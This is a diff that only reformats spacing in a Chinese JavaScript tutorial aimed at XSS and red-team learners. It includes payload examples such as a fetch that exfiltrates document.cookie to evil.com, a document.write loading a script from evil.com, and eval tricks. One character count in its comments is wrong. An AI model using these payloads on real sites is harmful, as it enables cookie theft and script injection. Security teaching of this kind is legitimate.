@@ -17,12 +17,12 @@
 ### 声明方式
 
 ```javascript
-var oldScoped = 1;     // 函数作用域，不推荐
-let blockScoped = 2;   // 块作用域，推荐
-const immutable = 3;   // 常量（但对象属性可变）
+var oldScoped = 1; // 函数作用域，不推荐
+let blockScoped = 2; // 块作用域，推荐
+const immutable = 3; // 常量（但对象属性可变）
 
 // var的坑：变量提升(hoisting)
-console.log(x);  // undefined（不是报错！）
+console.log(x); // undefined（不是报错！）
 var x = 5;
 ```
 
@@ -43,17 +43,17 @@ var x = 5;
 
 ```javascript
 // 弱类型转换 —— XSS payload常利用这个
-[] + []       // ""  (空字符串)
-[] + {}       // "[object Object]"
-{} + []       // 0 ({}被解析为空代码块)
-1 + "2"       // "12" (数字转字符串)
-"2" - 1       // 1 (字符串转数字)
-!!"false"     // true (非空字符串为truthy)
-!!0           // false (0为falsy)
+[] + [] // "" (空字符串)
+[] + {} // "[object Object]"
+{} + [] // 0 ({}被解析为空代码块)
+1 + "2" // "12" (数字转字符串)
+"2" - 1 // 1 (字符串转数字)
+!!"false" // true (非空字符串为truthy)
+!!0 // false (0为falsy)
 
 // XSS payload常见的精简技巧
-alert``       // 等同于 alert("")
-(alert)(1)    // 括号包裹不影响调用
+alert`` // 等同于 alert("")
+(alert)(1) // 括号包裹不影响调用
 ```
 
 ## 二、运算符与表达式
@@ -65,26 +65,26 @@ alert``       // 等同于 alert("")
 + - * / % **
 
 // 比较（XSS WAF绕过常用）
-==  vs ===   // 宽松比较 vs 严格比较
-null == undefined  // true
-[] == false        // true
-"0" == false       // true
+== vs === // 宽松比较 vs 严格比较
+null == undefined // true
+[] == false // true
+"0" == false // true
 
 // 逻辑（短路求值常用于精简payload）
 && || !
-a && b      // a为true则返回b，否则返回a
-a || b      // a为true则返回a，否则返回b
+a && b // a为true则返回b，否则返回a
+a || b // a为true则返回a，否则返回b
 
 // 逗号运算符
-(1, 2, 3)   // 返回3 (常用于混淆)
+(1, 2, 3) // 返回3 (常用于混淆)
 ```
 
 ### 三元运算符精简payload
 
 ```javascript
 // 条件 ? 真值 : 假值
-1 ? alert(1) : 0;       // alert(1) 执行
-0 ? 1 : confirm(1);      // confirm(1) 执行
+1 ? alert(1) : 0; // alert(1) 执行
+0 ? 1 : confirm(1); // confirm(1) 执行
 
 // 嵌套三元实现if-else
 a ? (b ? c() : d()) : e()
@@ -104,13 +104,13 @@ while (condition) { ... }
 do { ... } while (condition);
 
 // 遍历
-for (let key in obj) { ... }      // 遍历可枚举属性（含原型链）
-for (let val of iterable) { ... }  // 遍历可迭代对象
+for (let key in obj) { ... } // 遍历可枚举属性（含原型链）
+for (let val of iterable) { ... } // 遍历可迭代对象
 
 // 控制
-break;     // 跳出循环
-continue;  // 跳过本次
-return;    // 函数返回
+break; // 跳出循环
+continue; // 跳过本次
+return; // 函数返回
 ```
 
 ## 四、函数
@@ -137,11 +137,11 @@ const fn = new Function('a', 'b', 'return a + b');
 ```javascript
 // Function构造器 —— eval替代品
 new Function('alert(1)')();
-[].constructor.constructor('alert(1)')();  // 通过数组原型获取Function
+[].constructor.constructor('alert(1)')(); // 通过数组原型获取Function
 
 // 间接eval
-(0, eval)('alert(1)');       // 间接eval（在全局作用域执行）
-window['eval']('alert(1)');   // 同上
+(0, eval)('alert(1)'); // 间接eval（在全局作用域执行）
+window['eval']('alert(1)'); // 同上
 
 // setTimeout/setInterval的字符串形式（等于eval）
 setTimeout('alert(1)', 0);
@@ -157,24 +157,24 @@ document.write('<script src=//evil.com/exploit.js><\/script>');
 
 ```javascript
 const obj = {
-  key1: 'value1',
-  key2: 42,
-  method() { return this.key1; },
-  ['computed']: '动态键名',
+ key1: 'value1',
+ key2: 42,
+ method() { return this.key1; },
+ ['computed']: '动态键名',
 };
 
 // 访问方式
-obj.key1           // 点号
-obj['key1']        // 方括号（支持变量）
-obj['__proto__']   // 直接访问原型链
+obj.key1 // 点号
+obj['key1'] // 方括号（支持变量）
+obj['__proto__'] // 直接访问原型链
 ```
 
 ### JSON
 
 ```javascript
-JSON.stringify(obj);       // 对象 → JSON字符串
-JSON.stringify(obj, null, 2);  // 格式化输出
-JSON.parse('{"a":1}');     // JSON字符串 → 对象
+JSON.stringify(obj); // 对象 → JSON字符串
+JSON.stringify(obj, null, 2); // 格式化输出
+JSON.parse('{"a":1}'); // JSON字符串 → 对象
 
 // 安全关注：JSON.parse 不会执行JS代码！
 // 但 JSONP 回调可以：callback({"user":"admin"})
@@ -183,11 +183,11 @@ JSON.parse('{"a":1}');     // JSON字符串 → 对象
 ### 关键原型方法
 
 ```javascript
-Object.keys(obj)           // 自有可枚举属性
-Object.values(obj)         // 值
-Object.entries(obj)        // [key, value]对
-Object.getOwnPropertyNames(obj)  // 所有自有属性（含不可枚举）
-Object.getPrototypeOf(obj)        // 获取原型
+Object.keys(obj) // 自有可枚举属性
+Object.values(obj) // 值
+Object.entries(obj) // [key, value]对
+Object.getOwnPropertyNames(obj) // 所有自有属性（含不可枚举）
+Object.getPrototypeOf(obj) // 获取原型
 Object.setPrototypeOf(obj, proto) // 设置原型（危险！）
 ```
 
@@ -196,14 +196,14 @@ Object.setPrototypeOf(obj, proto) // 设置原型（危险！）
 ### 常用方法
 
 ```javascript
-arr.push(x)          // 末尾添加
-arr.pop()            // 末尾移除
-arr.shift()          // 开头移除
-arr.unshift(x)       // 开头添加
-arr.splice(i, n)     // 删除/插入（原地修改）
-arr.slice(i, j)      // 浅拷贝片段
-arr.concat(arr2)     // 合并
-arr.join(',')        // 转为字符串
+arr.push(x) // 末尾添加
+arr.pop() // 末尾移除
+arr.shift() // 开头移除
+arr.unshift(x) // 开头添加
+arr.splice(i, n) // 删除/插入（原地修改）
+arr.slice(i, j) // 浅拷贝片段
+arr.concat(arr2) // 合并
+arr.join(',') // 转为字符串
 
 // 遍历
 arr.forEach(x => console.log(x));
@@ -213,7 +213,7 @@ arr.reduce((acc, x) => acc + x, 0);
 arr.find(x => x > 5);
 
 // 排序
-arr.sort((a, b) => a - b);  // 数字排序
+arr.sort((a, b) => a - b); // 数字排序
 arr.reverse();
 
 // 包含判断（XSS中有用）
@@ -229,15 +229,15 @@ arr.indexOf(x);
 let global = 'global';
 
 function outer() {
-  let outerVar = 'outer';
-  
-  function inner() {
-    let innerVar = 'inner';
-    console.log(global, outerVar, innerVar);  // 全可访问
-  }
-  
-  inner();
-  // console.log(innerVar);  // 报错：不可访问
+ let outerVar = 'outer';
+ 
+ function inner() {
+ let innerVar = 'inner';
+ console.log(global, outerVar, innerVar); // 全可访问
+ }
+ 
+ inner();
+ // console.log(innerVar); // 报错：不可访问
 }
 ```
 
@@ -245,15 +245,15 @@ function outer() {
 
 ```javascript
 function createCounter() {
-  let count = 0;           // 闭包捕获的变量
-  return function() {
-    return ++count;         // 即使createCounter执行完，count仍存活
-  };
+ let count = 0; // 闭包捕获的变量
+ return function() {
+ return ++count; // 即使createCounter执行完，count仍存活
+ };
 }
 
 const counter = createCounter();
-counter();  // 1
-counter();  // 2
+counter(); // 1
+counter(); // 2
 ```
 
 红队应用：闭包可以隐藏恶意代码的上下文，避免变量名冲突。
@@ -264,31 +264,31 @@ counter();  // 2
 
 ```javascript
 setTimeout(() => {
-  console.log('async callback');
+ console.log('async callback');
 }, 0);
-console.log('sync first');   // 先输出
+console.log('sync first'); // 先输出
 ```
 
 ### Promise
 
 ```javascript
 fetch('https://api.example.com/data')
-  .then(response => response.json())
-  .then(data => console.log(data))
-  .catch(err => console.error(err));
+ .then(response => response.json())
+ .then(data => console.log(data))
+ .catch(err => console.error(err));
 ```
 
 ### async/await
 
 ```javascript
 async function getData() {
-  try {
-    const response = await fetch('https://api.example.com/data');
-    const data = await response.json();
-    return data;
-  } catch (err) {
-    console.error(err);
-  }
+ try {
+ const response = await fetch('https://api.example.com/data');
+ const data = await response.json();
+ return data;
+ } catch (err) {
+ console.error(err);
+ }
 }
 ```
 
@@ -307,13 +307,13 @@ async function getData() {
 
 ```javascript
 // 短小精悍的payload
-onerror=alert(1)                     // 28 chars
-eval(location.hash.slice(1))         // URL hash载入任意JS
-eval(atob('YWxlcnQoMSk='))           // base64编码payload
-fetch('//evil.com/?c='+document.cookie)  // Cookie外泄
+onerror=alert(1) // 28 chars
+eval(location.hash.slice(1)) // URL hash载入任意JS
+eval(atob('YWxlcnQoMSk=')) // base64编码payload
+fetch('//evil.com/?c='+document.cookie) // Cookie外泄
 
 // 无字母数字payload（JSFuck风格）
-[][(![]+[])[+[]]+...]                // 仅用 []!+(){} 表示任意JS
+[][(![]+[])[+[]]+...] // 仅用 []!+(){} 表示任意JS
 ```
 
 ### 核心API速查
